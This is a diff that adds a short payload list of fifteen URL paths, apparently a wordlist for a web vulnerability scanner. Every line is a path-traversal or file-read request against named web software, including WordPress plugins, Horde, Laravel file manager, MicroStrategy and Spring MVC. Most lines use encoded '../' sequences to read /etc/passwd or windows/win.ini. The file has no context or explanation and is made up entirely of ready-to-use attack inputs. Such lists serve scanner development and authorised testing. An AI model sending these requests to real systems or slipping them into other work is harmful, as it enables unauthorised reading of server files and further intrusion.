@@ -1,0 +1,15 @@
+/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
+/comm.php?id=../../../../../../../../../../etc/passwd
+/viewrq.php?format=ps&var_filename=../../../../../../../../../../etc/passwd
+/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00
+/wp-content/plugins/count-per-day/download.php?n=1&f=/etc/passwd
+/controlcenter.php?opt=contents/Files&dir=%2Fetc&ffile=passwd&opmod=open
+/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
+/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
+/WebMstr7/servlet/mstrWeb?evt=3045&src=mstrWeb.3045&subpage=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+/%2f/
+/sample-apps/hello/%2f/
+/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd
+/laravel-filemanager/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd
+/resources/qmc/fonts/../../../qrs/ReloadTask?xrfkey=1333333333333337&filter=.ttf
+/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
